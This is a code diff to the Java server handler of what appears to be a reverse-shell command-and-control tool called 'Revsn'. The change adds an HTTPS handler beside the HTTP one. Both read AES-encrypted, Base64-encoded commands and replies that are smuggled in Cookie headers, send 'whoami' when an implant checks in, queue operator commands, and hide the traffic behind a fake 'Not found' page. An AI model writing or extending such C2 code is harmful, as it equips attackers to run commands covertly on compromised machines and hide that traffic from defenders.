@@ -1,6 +1,8 @@
 package com.revsni.server.http;
 
 import java.io.IOException;
+import java.io.OutputStream;
+import java.nio.charset.StandardCharsets;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
@@ -12,6 +14,11 @@ import org.apache.http.HttpRequest;
 import org.apache.http.HttpResponse;
 import org.apache.http.protocol.HttpContext;
 import org.apache.http.protocol.HttpRequestHandler;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+import com.sun.net.httpserver.HttpExchange;
+import com.sun.net.httpserver.HttpHandler;
 
 //import java.util.ArrayList;
 //import java.util.List;
@@ -26,20 +33,29 @@ import javax.crypto.spec.SecretKeySpec;
 
 import org.apache.commons.codec.binary.Base64;
 
-public class HTTPHandler implements HttpRequestHandler {
+public class HTTPHandler implements HttpRequestHandler, HttpHandler {
+    Logger logger = LogManager.getLogger(getClass());
+    
     //private volatile List<String> commands = new ArrayList<>();
     private volatile String answerCommands;
     private volatile boolean est = false;
     private SecretKey key;
     private IvParameterSpec iv;
+    private SecretKey keyRaw;
+    private IvParameterSpec ivRaw;
+
     private Cipher cipherDec;
     private Cipher cipherEnc;
     //private volatile boolean gotAnswer;
 
     protected static final StringEntity http404 = new StringEntity("<html><body><h1>Not found</h1></body></html>", ContentType.create("text/html", "UTF-8"));
 
+    protected static final String https404 = new String("<html><body><h1>Not found</h1></body></html>");
+
     public HTTPHandler(SecretKey key1, IvParameterSpec iv) {
         super();
+        this.keyRaw = key1;
+        this.ivRaw = iv;
         this.key = new SecretKeySpec(key1.getEncoded(), key1.getAlgorithm());
         this.iv = new IvParameterSpec(iv.getIV());
 
@@ -60,7 +76,7 @@ public class HTTPHandler implements HttpRequestHandler {
         String respo = command;
         try {
             answerCommands = new String(Base64.encodeBase64String(cipherEnc.doFinal(respo.getBytes())));
-            System.out.println("Waiting for Response..");
+            logger.info("Waiting for Response..");
             respo = "";
         } catch (IllegalBlockSizeException | BadPaddingException e) {
             e.printStackTrace();
@@ -87,13 +103,13 @@ public class HTTPHandler implements HttpRequestHandler {
                         try {
                             response.setHeader("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("whoami".getBytes())));
                         } catch (IllegalBlockSizeException | BadPaddingException e) {
-                            System.out.println("Failed to send init whoami command (HTTP-Rev)");
+                            logger.info("Failed to send init whoami command (HTTP-Rev)");
                         }
                     } else if(msg.equals("kill")) {
                         try {
                             response.setHeader("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("quit".getBytes())));
                         } catch (IllegalBlockSizeException | BadPaddingException e) {
-                            System.out.println("Failed to send Quit command (HTTP-Rev)");
+                            logger.info("Failed to send Quit command (HTTP-Rev)");
                         }
                     } else if(msg.equals("give") && answerCommands.length() > 0) {
                         response.setHeader("Cookie", answerCommands);
@@ -101,7 +117,7 @@ public class HTTPHandler implements HttpRequestHandler {
                     } else if(msg.equals("give") && answerCommands.length() == 0) {
 
                     } else {
-                        System.out.println(msg);
+                        logger.info(msg);
                         System.out.print("Revsn [HTTP] » ");
                     }
                     response.setStatusCode(200);
@@ -116,6 +132,79 @@ public class HTTPHandler implements HttpRequestHandler {
         
     public boolean getConnInf() {
         return this.est;
+    }
+
+    @Override
+    public void handle(HttpExchange ex) throws IOException {
+        String msg = "";
+        String cookie = "";
+
+        logger.info(ex.getRequestMethod());
+        
+        msg = ex.getRequestHeaders().getFirst("Cookie");
+
+        if(ex.getRequestMethod().equals("GET") && ex.getRequestURI().getPath().contains("lit")) {
+            if(msg != null) {
+                cookie = msg;
+
+                if(cookie.length() > 1) {
+
+                    try {
+                        msg = new String(cipherDec.doFinal(Base64.decodeBase64(cookie)));
+                    } catch (IllegalBlockSizeException | BadPaddingException e) {
+                        e.printStackTrace();
+                    }
+                    if(msg.equals("est")) {
+                        est = true;
+                        try {
+                            ex.getResponseHeaders().add("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("whoami".getBytes())));
+                        } catch (IllegalBlockSizeException | BadPaddingException e) {
+                            logger.info("Failed to send init whoami command (HTTP-Rev)");
+                        }
+                    } else if(msg.equals("kill")) {
+                        try {
+                            ex.getResponseHeaders().add("Cookie", Base64.encodeBase64String(cipherEnc.doFinal("quit".getBytes())));
+                        } catch (IllegalBlockSizeException | BadPaddingException e) {
+                            logger.info("Failed to send Quit command (HTTP-Rev)");
+                        }
+                    } else if(msg.equals("give") && answerCommands.length() > 0) {
+                        ex.getResponseHeaders().add("Cookie", answerCommands);
+                        answerCommands = "";
+                    } else if(msg.equals("give") && answerCommands.length() == 0) {
+
+                    } else {
+                        logger.info(msg);
+                        System.out.print("Revsn [HTTPS] » ");
+                    }
+                    ex.sendResponseHeaders(200, https404.length());
+                    OutputStream os = ex.getResponseBody();
+                    os.write(https404.getBytes(StandardCharsets.UTF_8));
+                    os.close();
+                } else {
+                    ex.sendResponseHeaders(200, https404.length());
+                    OutputStream os = ex.getResponseBody();
+                    os.write(https404.getBytes(StandardCharsets.UTF_8));
+                    os.close();
+                }
+            }
+        }
+        
+    }
+
+    public SecretKey getKeyRaw() {
+        return this.keyRaw;
+    }
+
+    public void setKeyRaw(SecretKey keyRaw) {
+        this.keyRaw = keyRaw;
+    }
+
+    public IvParameterSpec getIvRaw() {
+        return this.ivRaw;
+    }
+
+    public void setIvRaw(IvParameterSpec ivRaw) {
+        this.ivRaw = ivRaw;
     }
     
 }
